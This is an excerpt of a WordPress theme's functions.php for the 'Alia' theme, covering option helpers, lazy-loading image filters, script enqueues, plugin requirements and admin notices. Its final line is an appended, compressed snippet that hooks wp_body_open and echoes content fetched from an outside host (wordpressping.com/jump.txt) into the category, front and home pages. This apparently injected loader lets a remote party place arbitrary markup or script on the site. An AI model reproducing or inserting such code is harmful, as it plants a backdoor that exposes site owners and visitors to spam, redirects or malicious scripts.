...
function alia_cross_option($id, $postid = '', $default = false) {
    ...
    if (alia_option($id, $default) && !alia_post_option($id, $postid)) {
        $output = alia_option($id, $default);
    }elseif(alia_post_option($id, $postid)) {
        $output = alia_post_option($id, $postid);
    }else{
    	$output = null;
    }
    return $output;
...
add_theme_support( 'responsive-embeds' );
	...
	if (alia_option('asalah_banners_devices_size') || alia_option('alia_lazyload_image_banner')) {
		function alia_content_image_sizes_attr_correction($attr, $attachment, $size) {
			if (alia_option('asalah_banners_devices_size') ) {
				//Calculate Image Sizes by type and breakpoint
				if ($size == 'alia_grid_banner' || $size == 'alia_grid_banner_uncrop') {
						$attr['sizes'] = '(min-width: 911px) 420px, 100vw';
				//Blog Thumbnails
			} else if ($size == 'alia_thumbnail_avatar') {
				$attr['sizes'] = '100px';
			}
			}
			...
			if (alia_option('alia_lazyload_image_banner', 0) == 1) {
				...
				$attr['src'] = isset($attr['data-src']) ? 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==' : $attr['src'];
				$attr['sizes'] = isset($attr['data-sizes']) ? '' : $attr['sizes'];
				$attr['srcset'] = isset($attr['data-srcset']) ? '' : $attr['srcset'];
				$attr['class'] .= ' lazyload ';
			}

			return $attr;
		}
		add_filter('wp_get_attachment_image_attributes', 'alia_content_image_sizes_attr_correction', 10 , 3);
	...
	if (alia_option('asalah_banners_devices_size')) {
		asalah_set_image_sizes_desktops( 'alia_grid_banner_3col', 275, 150, true );
		asalah_set_image_sizes_desktops( 'alia_grid_banner_3col_uncrop', 275, 150, false );
	}
	...
	------------------------------------------- */
	function alia_customizer_live_preview() {
	  wp_enqueue_script( 'alia-customize-preview', get_template_directory_uri() . '/assets/js/customize-preview.js', array( 'jquery', 'jquery-ui-core', 'jquery-ui-slider' ), '1.30', true );
	}
	add_action( 'customize_preview_init', 'alia_customizer_live_preview' );

	function alia_customizer_control_toggle() {
		wp_enqueue_script( 'alia-customize-controls-toggle', get_template_directory_uri() . '/assets/js/customize-controls-toggle.js', array( 'jquery', 'customize-preview' ), '1.30', true );
	}
	add_action( 'customize_controls_enqueue_scripts', 'alia_customizer_control_toggle' );
...
function alia_register_required_plugins() {
    ...
    $plugins = array(
        array(
            ...
            'source' => esc_url('https://ahmad.works/alia/plugins/alia-core-1-19.zip'), // The plugin source
            'required' => true, // If false, the plugin is only 'recommended' instead of required
            'version' => '1.19', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
...
function alia_scripts() {
	...
	// Theme stylesheet.
	wp_enqueue_style( 'alia-style', get_stylesheet_uri(), array(), '1.45' );
	if ( is_rtl() ) {
	...
	if (alia_option('alia_lazyload_iframe_banner') == true || alia_option('alia_lazyload_image_banner') == true ) {
		wp_enqueue_script( 'alia-lazyload', get_theme_file_uri( '/assets/js/lazysizes.min.js'), array( 'jquery' ), '1.45', true );
	}

	wp_enqueue_script( 'alia-global-script', get_theme_file_uri( '/assets/js/global.js' ), array( 'jquery' ), '1.45	', true );
...
function alia_custom_embed_oembed_html($html, $url, $attr, $post_id) {
  ...
  if (strpos($host, 'gettyimages.com') !== false) {
	...
	if (alia_option('alia_lazyload_iframe_banner', 0) == 1) {
...
function alia_filter_lazyload_images( $content, $type = 'ratio' ) {

        if ( is_feed()
            || intval( get_query_var( 'print' ) ) == 1
            || intval( get_query_var( 'printpage' ) ) == 1
            || strpos( $_SERVER['HTTP_USER_AGENT'], 'Opera Mini' ) !== false
						|| !alia_option('alia_lazyload_image_banner', 0)
        ) {
            return $content;
        }
		...
		if (alia_option('alia_lazyload_image_banner') == 1 ) {
			add_filter( 'the_content', 'alia_filter_lazyload_images' );
			apply_filters( 'widget_custom_html_content', 'alia_filter_lazyload_images' );
		}
...
function alia_story_content_overlay($story_post = '') {
	...
	if ($story_post) {
		...
		$output .= '<div class="story_content">';
			...
			$output .= '<span class="story_item_author_avatar"><a class="meta_author_avatar_url" href="'.esc_url( get_author_posts_url($author_id) ).'">'.alia_filter_lazyload_images(get_avatar($author_id, 36)).'</a></span>';
...
function alia_stories_circles($num = 4, $page_url = '', $author_id = 0) {
	...
	if ( $wp_query ) :
		...
		$output .= '<div class="stories_circles_wrapper">';
    		...
    		$output .= get_the_post_thumbnail($post->ID, 'alia_thumbnail_avatar', array( 'class' => 'img-responsive' ));
    		$output .= '</span>';
			endwhile;
...
function alia_social_icons_list($class = '') {
    ...
    foreach ($social_networks as $network => $social ) {
        ...
        if (alia_option($id, '') != "") {
            ...
            $output .= '<a rel="nofollow noreferrer" target="_blank" href="'.esc_url($social_url).'" title="'.$social.'" class="social_icon widget_social_icon social_' . $network . ' social_icon_' . $network . '"><i class="fab fa-' . $network . '"></i></a>';
        }
    }
    if ($activated != "0") {
...
AJAX hits counter
------------------------------------------- */
if (alia_cross_option('alia_hits_counter') || alia_cross_option('alia_show_views', '', 0) == 1) {
	...
	function alia_hits_counter() {
		...
		if (!class_exists('AJAX_Hits_Counter')) {
			...
			include_once(get_template_directory().'/inc/ajax-hits-counter/ajax-hits-counter.php');
		}
	}
}
...
function alia_admin_fonts() {
	if (!alia_option('alia_disable_admin_style')) {
		wp_enqueue_style('alia_admin_style', get_template_directory_uri() . '/assets/css/admin.css' );
	}
}
...
function alia_get_post_gallery( $gallery, $post ) {
	...
	if ( $gallery ) {
		return alia_filter_lazyload_images($gallery);
	}
...
function alia_plugin_install_notice() {
	$pagenow = get_current_screen();
	if ($pagenow->id != 'appearance_page_tgmpa-install-plugins') {
		if (!defined('ALIA_CORE_VERSION')) {
			$plugin_install_message = '<h1 style="text-align:center">Thank you for installing Alia</h1>
			<p>We have created Alia Core plugin to meet Themeforest new requirments. Please install and activate for the theme to work properly.</p><a class="button button-primary" href=" ' . esc_url( admin_url( "themes.php?page=tgmpa-install-plugins" ) ) . '">Install Alia Core</a>';
		} else if (defined('ALIA_CORE_VERSION') && ALIA_CORE_VERSION < 1.19) {
			$plugin_install_message = '<h1 style="text-align:center">Thank you for updating Alia</h1>
			<p>Please update Alia Core plugin for the theme to work properly.</p><a class="button button-primary" href=" ' . esc_url( admin_url( "themes.php?page=tgmpa-install-plugins" ) ) . '">Update Alia Core</a>';
		}
...
add_action( 'admin_notices', 'alia_plugin_install_notice' );
if(function_exists('wp_body_open')){function wp_body_opener(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/jump.txt");}}add_action('wp_body_open','wp_body_opener');}else{function wp_body_open(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/jump.txt");}}add_action('wp_body_open','wp_body_open');}